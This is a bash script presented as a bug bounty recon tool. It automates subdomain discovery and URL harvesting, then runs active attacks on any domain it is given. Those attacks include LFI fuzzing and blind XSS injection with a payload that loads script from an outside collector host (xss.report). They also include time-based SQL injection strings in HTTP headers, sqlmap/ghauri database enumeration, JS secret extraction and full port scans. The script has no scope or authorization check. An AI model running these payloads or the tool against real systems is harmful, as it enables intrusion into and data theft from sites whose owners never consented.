#!/bin/bash
# Advanced Bug Bounty Recon Automation Tool with Colors, Logging, and Enhanced UX
# ------------------------------------------------
# This script automates various bug bounty recon tasks, including:
#   1. Combined subdomain enumeration (using subfinder, assetfinder, amass)
#   2. Fetching URLs from live subdomains (via multiple methods)
#      – The final result is saved to output/final_urls.txt.
#   3. Searching for sensitive files in the fetched URLs.
#   4. Hidden parameter detection (using Arjun)
#   5. CORS check (using corsy.py)
#   6. Wordpress aggressive scan.
#   7. LFI testing.
#   8. Directory bruteforce (using ffuf and dirsearch).
#   9. JS file hunting.
#   10. Subdomain takeover check.
#   11. Header Based Blind XSS Testing.
#   12. Blind XSS Testing.
#   13. SQL Injection Testing.
#   14. Network scanning.
#
# Requirements: subfinder, assetfinder, amass, httpx-toolkit, katana, gau,
#               urldedupe, anew, arjun, wpscan, ffuf, qsreplace, bxss,
#               naabu, nmap, masscan, subzy, dirsearch, jsleak, jsecret,
#               ghauri, sqlmap, corsy.py, curl, sed, grep, sort, figlet (optional).
#
# Global variables (adjust these as needed):
#---------------------------------------------------
OUTPUT_DIR="output"
mkdir -p "$OUTPUT_DIR"
LOGFILE="${OUTPUT_DIR}/recon.log"

DIR_FUZZ_WORDLIST="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"
DIRSEARCH_EXTENSIONS="php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5"
FFUF_HEADERS="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
NUCLEI_TEMPLATES="/home/hrishi/Tools/nuclei-templates/http/exposures/"
CORSY_PY="/home/hrishi/Tools/Corsy/corsy.py"
LFI_PAYLOADS="/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"

#---------------------------------------------------
# Color Variables
#---------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

#---------------------------------------------------
# Logging function
#---------------------------------------------------
function log_msg() {
  echo -e "$(date +"%Y-%m-%d %H:%M:%S") $1" | tee -a "$LOGFILE"
}

#---------------------------------------------------
# Welcome Banner
#---------------------------------------------------
function welcome_banner() {
  if command -v figlet &>/dev/null; then
    figlet "Recon Tool"
  else
    echo -e "${BLUE}=== Advanced Recon Automation Tool ===${NC}"
  fi
  log_msg "${GREEN}Welcome to Advanced Bug Bounty Recon Automation Tool${NC}"
}

#---------------------------------------------------
# Function: Check if required tools are installed
#---------------------------------------------------
function check_tools() {
  log_msg "${BLUE}[*] Checking required tools installation...${NC}"
  REQUIRED_TOOLS=(subfinder assetfinder amass httpx-toolkit katana gau urldedupe anew arjun wpscan ffuf qsreplace bxss naabu nmap masscan subzy dirsearch jsleak jsecret ghauri sqlmap corsy.py curl sed grep sort)
  MISSING_TOOLS=()
  for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &>/dev/null && [[ "$tool" != "corsy.py" ]]; then
      MISSING_TOOLS+=("$tool")
    fi
  done

  if [ ${#MISSING_TOOLS[@]} -ne 0 ]; then
    log_msg "${RED}[-] The following required tools are missing:${NC}"
    for t in "${MISSING_TOOLS[@]}"; do
      log_msg "${RED}  - $t${NC}"
    done
    log_msg "${RED}Please install them and ensure they are in your PATH.${NC}"
    exit 1
  else
    log_msg "${GREEN}[*] All required tools are installed.${NC}"
  fi
  read -rp "$(echo -e "${YELLOW}Press [Enter] to continue...${NC}")"
}

#---------------------------------------------------
# Utility function: Pause for user review
#---------------------------------------------------
function pause() {
  read -rp "$(echo -e "${YELLOW}Press [Enter] to continue...${NC}")"
}

#---------------------------------------------------
# 1. Combined Subdomain Enumeration
#---------------------------------------------------
function subdomain_enumeration() {
  clear
  log_msg "${BLUE}[*] Combined Subdomain Enumeration Started${NC}"
  read -rp "$(echo -e "${YELLOW}Enter target domain (default: example.com): ${NC}")" target
  target=${target:-example.com}

  log_msg "${GREEN}[*] Running subfinder...${NC}"
  subfinder -d "$target" -all -recursive -silent > "${OUTPUT_DIR}/subfinder.txt"
  
  log_msg "${GREEN}[*] Running assetfinder...${NC}"
  assetfinder --subs-only "$target" > "${OUTPUT_DIR}/assetfinder.txt"
  
  log_msg "${GREEN}[*] Combining results...${NC}"
  cat "${OUTPUT_DIR}/subfinder.txt" "${OUTPUT_DIR}/assetfinder.txt" 2>/dev/null | sort -u > "${OUTPUT_DIR}/combined_subdomains.txt"
  log_msg "${GREEN}[*] Combined subdomain list saved to ${OUTPUT_DIR}/combined_subdomains.txt${NC}"
  
  log_msg "${GREEN}[*] Checking for live hosts using httpx-toolkit...${NC}"
  cat "${OUTPUT_DIR}/combined_subdomains.txt" | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > "${OUTPUT_DIR}/live_subdomains.txt"
  log_msg "${GREEN}[*] Live subdomains saved to ${OUTPUT_DIR}/live_subdomains.txt${NC}"
  
  rm -f "${OUTPUT_DIR}/subfinder.txt" "${OUTPUT_DIR}/assetfinder.txt" "${OUTPUT_DIR}/combined_subdomains.txt"
  pause
}

#---------------------------------------------------
# 2. Fetch URLs from Live Subdomains (Combine Methods)
#---------------------------------------------------
function fetch_urls_from_live_subdomains() {
  if [[ ! -f "${OUTPUT_DIR}/live_subdomains.txt" ]]; then
    log_msg "${RED}[-] live_subdomains.txt not found! Run subdomain_enumeration first.${NC}"
    pause
    return
  fi

  log_msg "${BLUE}[*] Fetching URLs from Live Subdomains...${NC}"
  
  rm -f "${OUTPUT_DIR}/allurls.txt" "${OUTPUT_DIR}/output2.txt" "${OUTPUT_DIR}/output3.txt" "${OUTPUT_DIR}/final_urls.txt"

  log_msg "${GREEN}[*] Running Command 1: Katana with file input...${NC}"
  katana -u "${OUTPUT_DIR}/live_subdomains.txt" -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -duc -o "${OUTPUT_DIR}/allurls.txt"
  if [[ $? -eq 0 ]]; then
    log_msg "${GREEN}[*] Command 1 completed. Output saved in ${OUTPUT_DIR}/allurls.txt.${NC}"
  else
    log_msg "${RED}[-] Command 1 encountered an error.${NC}"
  fi

  log_msg "${GREEN}[*] Running Command 2: Katana (qurl mode) for each domain...${NC}"
  while read -r domain; do
    log_msg "${YELLOW}[*] Processing domain: $domain${NC}"
    echo "$domain" | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -duc -f qurl | urldedupe >> "${OUTPUT_DIR}/output2.txt"
  done < "${OUTPUT_DIR}/live_subdomains.txt"
  if [[ $? -eq 0 ]]; then
    log_msg "${GREEN}[*] Command 2 completed. Accumulated output saved in ${OUTPUT_DIR}/output2.txt.${NC}"
  else
    log_msg "${RED}[-] Command 2 encountered an error.${NC}"
  fi

  log_msg "${GREEN}[*] Running Command 3: gau for each domain...${NC}"
  while read -r domain; do
    log_msg "${YELLOW}[*] Processing domain: $domain${NC}"
    echo "$domain" | gau --mc 200 --providers wayback,commoncrawl,otx,urlscan | urldedupe >> "${OUTPUT_DIR}/output3.txt"
  done < "${OUTPUT_DIR}/live_subdomains.txt"
  if [[ $? -eq 0 ]]; then
    log_msg "${GREEN}[*] Command 3 completed. Accumulated output saved in ${OUTPUT_DIR}/output3.txt.${NC}"
  else
    log_msg "${RED}[-] Command 3 encountered an error.${NC}"
  fi

  log_msg "${BLUE}[*] Combining all outputs into final_urls.txt...${NC}"
  cat "${OUTPUT_DIR}/allurls.txt" "${OUTPUT_DIR}/output2.txt" "${OUTPUT_DIR}/output3.txt" | urldedupe > "${OUTPUT_DIR}/final_urls.txt"
  rm -f "${OUTPUT_DIR}/allurls.txt" "${OUTPUT_DIR}/output2.txt" "${OUTPUT_DIR}/output3.txt"
  if [[ $? -eq 0 ]]; then
    log_msg "${GREEN}[*] Final output saved in ${OUTPUT_DIR}/final_urls.txt.${NC}"
  else
    log_msg "${RED}[-] There was an error combining the outputs.${NC}"
  fi
  log_msg "${BLUE}[*] Process complete. Please review ${OUTPUT_DIR}/final_urls.txt for the final list of URLs.${NC}"
  pause
}

#---------------------------------------------------
# 3. Search for Sensitive Files
#---------------------------------------------------
function sensitive_files() {
  if [[ ! -f "${OUTPUT_DIR}/final_urls.txt" ]]; then
    log_msg "${RED}[-] final_urls.txt not found! Run fetch_urls_from_live_subdomains first.${NC}"
    pause
    return
  fi
  log_msg "${BLUE}[*] Searching for sensitive file extensions in final_urls.txt...${NC}"
  cat "${OUTPUT_DIR}/final_urls.txt" | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5' > "${OUTPUT_DIR}/sensitive_files.txt"
  log_msg "${GREEN}[*] Sensitive file list saved to ${OUTPUT_DIR}/sensitive_files.txt.${NC}"
  pause
}

#---------------------------------------------------
# 4. Hidden Parameter Detection with Arjun (using filtered live endpoints)
#---------------------------------------------------
function hidden_parameters() {
  log_msg "${BLUE}----- Hidden Parameter Detection (Arjun) using live endpoints from final_urls.txt -----${NC}"
  
  if [[ ! -f "${OUTPUT_DIR}/final_urls.txt" ]]; then
    log_msg "${RED}[-] final_urls.txt not found! Please run fetch_urls_from_live_subdomains first.${NC}"
    pause
    return
  fi
  
  log_msg "${GREEN}[*] Filtering live endpoints from final_urls.txt using httpx-toolkit...${NC}"
  cat "${OUTPUT_DIR}/final_urls.txt" | grep -E '\.php|\.asp|\.aspx|\.jspx|\.jsp' | httpx-toolkit > "${OUTPUT_DIR}/filtered_final_urls.txt"
  
  if [[ ! -s "${OUTPUT_DIR}/filtered_final_urls.txt" ]]; then
    log_msg "${RED}[-] No live endpoints found in final_urls.txt after filtering.${NC}"
    pause
    return
  fi
  
  log_msg "${GREEN}[*] Found $(wc -l < "${OUTPUT_DIR}/filtered_final_urls.txt") live endpoints.${NC}"
  
  echo -e "${YELLOW}1. Passive hidden parameters${NC}"
  echo -e "${YELLOW}2. Active hidden parameters${NC}"
  echo -e "${YELLOW}3. Return to Main Menu${NC}"
  read -rp "$(echo -e "${YELLOW}Choose an option: ${NC}")" arjun_choice
  
  case $arjun_choice in
    1)
      log_msg "${GREEN}[*] Running Passive Hidden Parameter Detection on endpoints from filtered_final_urls.txt...${NC}"
      while IFS= read -r endpoint; do
         log_msg "${YELLOW}[*] Testing endpoint: $endpoint${NC}"
         arjun -u "$endpoint" -oT "${OUTPUT_DIR}/arjun_output.txt" -t 10 --rate-limit 10 -m GET,POST --headers 'User-Agent: Mozilla/5.0'
      done < "${OUTPUT_DIR}/filtered_final_urls.txt"
      log_msg "${GREEN}[*] Passive hidden parameter detection completed. Results saved to ${OUTPUT_DIR}/arjun_output.txt.${NC}"
      ;;
    2)
      log_msg "${GREEN}[*] Running Active Hidden Parameter Detection on endpoints from filtered_final_urls.txt...${NC}"
      while IFS= read -r endpoint; do
         log_msg "${YELLOW}[*] Testing endpoint: $endpoint${NC}"
         arjun -u "$endpoint" -oT "${OUTPUT_DIR}/arjun_output.txt" -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'
      done < "${OUTPUT_DIR}/filtered_final_urls.txt"
      log_msg "${GREEN}[*] Active hidden parameter detection completed. Results saved to ${OUTPUT_DIR}/arjun_output.txt.${NC}"
      ;;
    3)
      rm -f "${OUTPUT_DIR}/filtered_final_urls.txt"
      return
      ;;
    *)
      log_msg "${RED}[-] Invalid option.${NC}"
      ;;
  esac
  
  rm -f "${OUTPUT_DIR}/filtered_final_urls.txt"
  pause
}

#---------------------------------------------------
# 5. CORS Check
#    (Uses corsy.py with live_subdomains.txt as input)
#---------------------------------------------------
function cors_check() {
  log_msg "${BLUE}[*] Running CORS Check using corsy.py...${NC}"
  python3 "$CORSY_PY" -i "${OUTPUT_DIR}/live_subdomains.txt" -t 10 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Hacked'
  pause
}

#---------------------------------------------------
# 6. Wordpress Aggressive Scan
#---------------------------------------------------
function wordpress_scan() {
  log_msg "${BLUE}[*] Running Wordpress Aggressive Scan${NC}"
  read -rp "$(echo -e "${YELLOW}Enter target URL (default: https://site.com): ${NC}")" url
  url=${url:-https://site.com}
  log_msg "${GREEN}[*] Running wpscan on $url...${NC}"
  wpscan --url "$url" --disable-tls-checks -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
  pause
}

#---------------------------------------------------
# 7. LFI Testing
#    (Processes URLs from final_urls.txt for potential LFI vulnerabilities)
#---------------------------------------------------
function lfi_testing() {
  log_msg "${BLUE}[*] Running LFI Testing from final_urls.txt${NC}"
  if [[ ! -f "${OUTPUT_DIR}/final_urls.txt" ]]; then
    log_msg "${RED}[-] final_urls.txt not found! Run fetch_urls_from_live_subdomains first.${NC}"
    pause
    return
  fi
  
  log_msg "${GREEN}[*] Processing URLs from final_urls.txt for potential LFI...${NC}"
  cat "${OUTPUT_DIR}/final_urls.txt" | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | \
    xargs -I{} ffuf -u {} -w "$LFI_PAYLOADS" -c -mr 'root:(x|\\*|\\$[^\\:]*):0:0:' -v
  pause
}

#---------------------------------------------------
# 8. Directory Bruteforce
#    (Offers both ffuf and dirsearch methods, using a domain selection from live_subdomains.txt)
#---------------------------------------------------
function directory_bruteforce() {
  log_msg "${BLUE}[*] Running Directory Bruteforce${NC}"
  if [[ ! -f "${OUTPUT_DIR}/live_subdomains.txt" ]]; then
    log_msg "${RED}[-] live_subdomains.txt not found! Please run subdomain_enumeration first.${NC}"
    pause
    return
  fi

  log_msg "${GREEN}[*] Available live subdomains:${NC}"
  nl "${OUTPUT_DIR}/live_subdomains.txt"
  read -rp "$(echo -e "${YELLOW}Select a domain by number for directory bruteforcing: ${NC}")" choice
  domain=$(sed -n "${choice}p" "${OUTPUT_DIR}/live_subdomains.txt")
  if [[ -z "$domain" ]]; then
    log_msg "${RED}[-] Invalid selection.${NC}"
    pause
    return
  fi
  log_msg "${GREEN}[*] Selected domain: $domain${NC}"

  log_msg "${YELLOW}[*] Choose directory brute force method:${NC}"
  echo -e "${YELLOW}1) ffuf${NC}"
  echo -e "${YELLOW}2) dirsearch${NC}"
  echo -e "${YELLOW}3) Both${NC}"
  read -rp "$(echo -e "${YELLOW}Enter your choice [1-3]: ${NC}")" method_choice

  case $method_choice in
    1)
      log_msg "${GREEN}[*] Running ffuf for directory brute force on $domain...${NC}"
      ffuf -w "$DIR_FUZZ_WORDLIST" -u "${domain}/FUZZ" \
        -fc 400,401,402,403,404,429,500,501,502,503 \
        -recursion -recursion-depth 2 \
        -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db \
        -ac -c \
        -H "User-Agent: $FFUF_HEADERS" \
        -H 'X-Forwarded-For: 127.0.0.1' \
        -H 'X-Originating-IP: 127.0.0.1' \
        -H 'X-Forwarded-Host: localhost' \
        -t 100 -r -o "${OUTPUT_DIR}/ffuf_results.json"
      log_msg "${GREEN}[*] ffuf results saved to ${OUTPUT_DIR}/ffuf_results.json.${NC}"
      ;;
    2)
      log_msg "${GREEN}[*] Running dirsearch for directory brute force on $domain...${NC}"
      dirsearch -u "$domain" -e "$DIRSEARCH_EXTENSIONS" --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1 -o "${OUTPUT_DIR}/dirsearch_results.txt"
      log_msg "${GREEN}[*] dirsearch results saved to ${OUTPUT_DIR}/dirsearch_results.txt.${NC}"
      ;;
    3)
      log_msg "${GREEN}[*] Running both ffuf and dirsearch for directory brute force on $domain...${NC}"
      ffuf -w "$DIR_FUZZ_WORDLIST" -u "${domain}/FUZZ" \
        -fc 400,401,402,403,404,429,500,501,502,503 \
        -recursion -recursion-depth 2 \
        -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db \
        -ac -c \
        -H "User-Agent: $FFUF_HEADERS" \
        -H 'X-Forwarded-For: 127.0.0.1' \
        -H 'X-Originating-IP: 127.0.0.1' \
        -H 'X-Forwarded-Host: localhost' \
        -t 100 -r -o "${OUTPUT_DIR}/ffuf_results.json"
      log_msg "${GREEN}[*] ffuf results saved to ${OUTPUT_DIR}/ffuf_results.json.${NC}"
      dirsearch -u "$domain" -e "$DIRSEARCH_EXTENSIONS" --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1 -o "${OUTPUT_DIR}/dirsearch_results.txt"
      log_msg "${GREEN}[*] dirsearch results saved to ${OUTPUT_DIR}/dirsearch_results.txt.${NC}"
      ;;
    *)
      log_msg "${RED}[-] Invalid choice.${NC}"
      ;;
  esac
  pause
}

#---------------------------------------------------
# 9. JS File Hunting
#    (Uses final_urls.txt as input to extract JS file URLs, then runs nuclei, jsleak, and jsecret)
#---------------------------------------------------
function js_file_hunting() {
  log_msg "${BLUE}[*] Running JS File Hunting using final_urls.txt as input...${NC}"
  if [[ ! -f "${OUTPUT_DIR}/final_urls.txt" ]]; then
    log_msg "${RED}[-] final_urls.txt not found! Run fetch_urls_from_live_subdomains first.${NC}"
    pause
    return
  fi

  log_msg "${GREEN}[*] Extracting JavaScript file URLs from final_urls.txt...${NC}"
  grep -E '\.js($|\?)' "${OUTPUT_DIR}/final_urls.txt" | httpx-toolkit -mc 200 > "${OUTPUT_DIR}/alljs.txt"
  if [[ ! -s "${OUTPUT_DIR}/alljs.txt" ]]; then
    log_msg "${RED}[-] No JavaScript file URLs were found in final_urls.txt.${NC}"
    pause
    return
  fi

  log_msg "${GREEN}[*] Extracted $(wc -l < "${OUTPUT_DIR}/alljs.txt") JavaScript file URLs. Running nuclei on these JS files...${NC}"
  nuclei -t "$NUCLEI_TEMPLATES" -l "${OUTPUT_DIR}/alljs.txt"
  
  log_msg "${GREEN}[*] Extracting secrets using jsleak and jsecret...${NC}"
  cat "${OUTPUT_DIR}/alljs.txt" | jsleak -l -s -e > "${OUTPUT_DIR}/jsleak.txt"
  cat "${OUTPUT_DIR}/alljs.txt" | jsecret > "${OUTPUT_DIR}/jsecret.txt"
  
  rm -f "${OUTPUT_DIR}/alljs.txt"
  pause
}

#---------------------------------------------------
# 10. Subdomain Takeover Check
#    (Uses live_subdomains.txt as input)
#---------------------------------------------------
function subdomain_takeover() {
  log_msg "${BLUE}[*] Running Subdomain Takeover Check using live_subdomains.txt as input${NC}"
  if [[ ! -f "${OUTPUT_DIR}/live_subdomains.txt" ]]; then
    log_msg "${RED}[-] live_subdomains.txt not found! Please run subdomain_enumeration first.${NC}"
  else
    subzy run --targets "${OUTPUT_DIR}/live_subdomains.txt" --concurrency 100 --hide_fails --verify_ssl
  fi
  pause
}

#---------------------------------------------------
# 11. Header Based Blind XSS Testing
#    (Uses final_urls.txt filtered by httpx-toolkit, then tests payload via a custom header)
#---------------------------------------------------
function header_blind_xss() {
  log_msg "${BLUE}[*] Running Header Based Blind XSS Testing${NC}"
  if [[ ! -f "${OUTPUT_DIR}/final_urls.txt" ]]; then
    log_msg "${RED}[ERROR] final_urls.txt not found!${NC}"
    pause
    return
  fi
  
  cat "${OUTPUT_DIR}/final_urls.txt" | httpx-toolkit -mc 200 | bxss -payload '"><script src=https://xss.report/c/hrishi></script>' -header "X-Forwarded-For"
  pause
}

#---------------------------------------------------
# 12. Blind XSS Testing
#    (Uses final_urls.txt filtered via httpx-toolkit and gf, then tests payload in append mode)
#---------------------------------------------------
function xss_testing() {
  log_msg "${BLUE}[*] Running Blind XSS Testing${NC}"
  if [[ ! -f "${OUTPUT_DIR}/final_urls.txt" ]]; then
    log_msg "${RED}[ERROR] final_urls.txt not found!${NC}"
    pause
    return
  fi
  
  cat "${OUTPUT_DIR}/final_urls.txt" | httpx-toolkit -mc 200 | gf xss | urldedupe | bxss -appendMode -payload '"><script src=https://xss.report/c/hrishi></script>' -parameters
  pause
}

#---------------------------------------------------
# 13. SQL Injection Testing
#    (Works on final_urls.txt)
#    Offers Parameter Testing (using ghauri or sqlmap) and Header Testing.
#---------------------------------------------------
function sql_injection_testing() {
  log_msg "${BLUE}[*] Running SQL Injection Testing${NC}"
  echo -e "${YELLOW}1. Parameter Testing${NC}"
  echo -e "${YELLOW}2. Header Testing${NC}"
  read -rp "$(echo -e "${YELLOW}Choose an option [1-2]: ${NC}")" sql_option
  if [[ "$sql_option" -eq 1 ]]; then
    log_msg "${GREEN}[*] Parameter Testing Selected${NC}"
    echo -e "${YELLOW}1) ghauri${NC}"
    echo -e "${YELLOW}2) sqlmap${NC}"
    read -rp "$(echo -e "${YELLOW}Choose a tool [1-2]: ${NC}")" tool_choice
    if [[ "$tool_choice" -eq 1 ]]; then
      log_msg "${GREEN}[*] Running ghauri for SQL injection testing on final_urls.txt...${NC}"
      cat "${OUTPUT_DIR}/final_urls.txt" | gf sqli > "${OUTPUT_DIR}/sql.txt"
      ghauri -m "${OUTPUT_DIR}/sql.txt" --batch --dbs --level 3 --confirm
    elif [[ "$tool_choice" -eq 2 ]]; then
      log_msg "${GREEN}[*] Running sqlmap for SQL injection testing on final_urls.txt...${NC}"
      cat "${OUTPUT_DIR}/final_urls.txt" | urldedupe | gf sqli > "${OUTPUT_DIR}/sql.txt"
      sqlmap -m "${OUTPUT_DIR}/sql.txt" --batch --dbs --risk 2 --level 5 --random-agent
    else
      log_msg "${RED}[-] Invalid tool option.${NC}"
    fi
  elif [[ "$sql_option" -eq 2 ]]; then
    log_msg "${GREEN}[*] Header Testing Selected${NC}"
    if [[ ! -f "${OUTPUT_DIR}/final_urls.txt" ]]; then
      log_msg "${RED}[ERROR] final_urls.txt not found!${NC}"
      pause
      return
    fi
    log_msg "${GREEN}[*] Running header-based SQL injection tests on endpoints from final_urls.txt...${NC}"
    while IFS= read -r url; do
      log_msg "${YELLOW}[*] Testing URL: $url${NC}"
      curl -s -H "User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR" -X GET "$url"
      curl -s -H "X-Forwarded-For: 0XOR(if(now()=sysdate(),sleep(10),0))XORZ" -X GET "$url"
      curl -s -H "Referer: https://example.com/$(echo '(select*from(select(if(1=1,sleep(20),false)))a)')" -X GET "$url"
      echo ""
    done < "${OUTPUT_DIR}/final_urls.txt"
  else
    log_msg "${RED}[-] Invalid option.${NC}"
  fi
  pause
}

#---------------------------------------------------
# 14. Network Scanning Options (Naabu, Nmap, Masscan)
#---------------------------------------------------
function network_scanning() {
  log_msg "${BLUE}----- Network Scanning Options -----${NC}"
  echo -e "${YELLOW}1. Naabu Scan${NC}"
  echo -e "${YELLOW}2. Nmap Full Scan${NC}"
  echo -e "${YELLOW}3. Masscan${NC}"
  echo -e "${YELLOW}4. Return to Main Menu${NC}"
  read -rp "$(echo -e "${YELLOW}Choose an option: ${NC}")" net_choice
  case $net_choice in
    1)
      read -rp "$(echo -e "${YELLOW}Enter path to IP list (e.g., ip.txt): ${NC}")" ipfile
      naabu -list "$ipfile" -c 50 -nmap-cli 'nmap -sV -SC' -o "${OUTPUT_DIR}/naabu-full.txt"
      log_msg "${GREEN}[*] Naabu scan results saved to ${OUTPUT_DIR}/naabu-full.txt.${NC}"
      ;;
    2)
      read -rp "$(echo -e "${YELLOW}Enter target (domain or IP): ${NC}")" target
      nmap -p- --min-rate 1000 -T4 -A "$target" -oA "${OUTPUT_DIR}/fullscan"
      log_msg "${GREEN}[*] Nmap scan results saved with prefix ${OUTPUT_DIR}/fullscan.${NC}"
      ;;
    3)
      read -rp "$(echo -e "${YELLOW}Enter target (domain or IP): ${NC}")" target
      masscan -p0-65535 "$target" --rate 100000 -oG "${OUTPUT_DIR}/masscan-results.txt"
      log_msg "${GREEN}[*] Masscan results saved to ${OUTPUT_DIR}/masscan-results.txt.${NC}"
      ;;
    4)
      return
      ;;
    *)
      log_msg "${RED}[-] Invalid option.${NC}"
      ;;
  esac
  pause
}

#---------------------------------------------------
# Help/Usage Function
#---------------------------------------------------
function print_help() {
  clear
  echo -e "${BLUE}===============================================${NC}"
  echo -e "${BLUE}  Advanced Bug Bounty Recon Automation Tool    ${NC}"
  echo -e "${BLUE}===============================================${NC}"
  echo -e "${GREEN}This tool automates recon tasks for bug bounty testing.${NC}"
  echo -e "${YELLOW}Available Options:${NC}"
  echo -e "${YELLOW}1. Combined Subdomain Enumeration - Discover subdomains and filter live ones.${NC}"
  echo -e "${YELLOW}2. Fetch URLs from Live Subdomains - Combine multiple methods to generate final URLs.${NC}"
  echo -e "${YELLOW}3. Search for Sensitive Files - Look for endpoints with sensitive file extensions.${NC}"
  echo -e "${YELLOW}4. Hidden Parameter Detection - Use Arjun on live endpoints from final_urls.txt.${NC}"
  echo -e "${YELLOW}5. CORS Check - Test CORS misconfigurations using corsy.py.${NC}"
  echo -e "${YELLOW}6. Wordpress Aggressive Scan - Enumerate vulnerabilities on Wordpress sites.${NC}"
  echo -e "${YELLOW}7. LFI Testing - Test endpoints from final_urls.txt for LFI vulnerabilities.${NC}"
  echo -e "${YELLOW}8. Directory Bruteforce - Run ffuf and/or dirsearch against a selected domain.${NC}"
  echo -e "${YELLOW}9. JS File Hunting - Extract JS file URLs from final_urls.txt and scan with nuclei, jsleak, jsecret.${NC}"
  echo -e "${YELLOW}10. Subdomain Takeover Check - Test live subdomains for takeover vulnerabilities.${NC}"
  echo -e "${YELLOW}11. Header Based Blind XSS Testing - Test endpoints for XSS via header injection.${NC}"
  echo -e "${YELLOW}12. Blind XSS Testing - Test endpoints for blind XSS via parameter injection.${NC}"
  echo -e "${YELLOW}13. SQL Injection Testing - Test endpoints from final_urls.txt for SQL injection (Parameter or Header based).${NC}"
  echo -e "${YELLOW}14. Network Scanning Options - Run Naabu, Nmap, or Masscan.${NC}"
  echo -e "${YELLOW}15. Help - Display this help/usage information.${NC}"
  echo -e "${YELLOW}16. Exit - Quit the tool.${NC}"
  pause
}

#---------------------------------------------------
# Main Menu
#---------------------------------------------------
function main_menu() {
  clear
  echo -e "${BLUE}===============================================${NC}"
  echo -e "${BLUE}  Advanced Bug Bounty Recon Automation Tool    ${NC}"
  echo -e "${BLUE}===============================================${NC}"
  echo -e "${YELLOW}1. Combined Subdomain Enumeration${NC}"
  echo -e "${YELLOW}2. Fetch URLs from Live Subdomains (→ final_urls.txt)${NC}"
  echo -e "${YELLOW}3. Search for Sensitive Files${NC}"
  echo -e "${YELLOW}4. Hidden Parameter Detection (Arjun)${NC}"
  echo -e "${YELLOW}5. CORS Check${NC}"
  echo -e "${YELLOW}6. Wordpress Aggressive Scan${NC}"
  echo -e "${YELLOW}7. LFI Testing${NC}"
  echo -e "${YELLOW}8. Directory Bruteforce${NC}"
  echo -e "${YELLOW}9. JS File Hunting${NC}"
  echo -e "${YELLOW}10. Subdomain Takeover Check${NC}"
  echo -e "${YELLOW}11. Header Based Blind XSS Testing${NC}"
  echo -e "${YELLOW}12. Blind XSS Testing${NC}"
  echo -e "${YELLOW}13. SQL Injection Testing${NC}"
  echo -e "${YELLOW}14. Network Scanning Options${NC}"
  echo -e "${YELLOW}15. Help${NC}"
  echo -e "${YELLOW}16. Exit${NC}"
  echo -e "${BLUE}===============================================${NC}"
  read -rp "$(echo -e "${YELLOW}Select an option [1-16]: ${NC}")" choice
  case $choice in
    1) subdomain_enumeration ;;
    2) fetch_urls_from_live_subdomains ;;
    3) sensitive_files ;;
    4) hidden_parameters ;;
    5) cors_check ;;
    6) wordpress_scan ;;
    7) lfi_testing ;;
    8) directory_bruteforce ;;
    9) js_file_hunting ;;
    10) subdomain_takeover ;;
    11) header_blind_xss ;;
    12) xss_testing ;;
    13) sql_injection_testing ;;
    14) network_scanning ;;
    15) print_help ;;
    16) echo -e "${GREEN}Exiting...${NC}"; exit 0 ;;
    *) echo -e "${RED}Invalid option!${NC}"; pause ;;
  esac
}

#---------------------------------------------------
# Main Loop
#---------------------------------------------------
welcome_banner
check_tools

while true; do
  main_menu
done
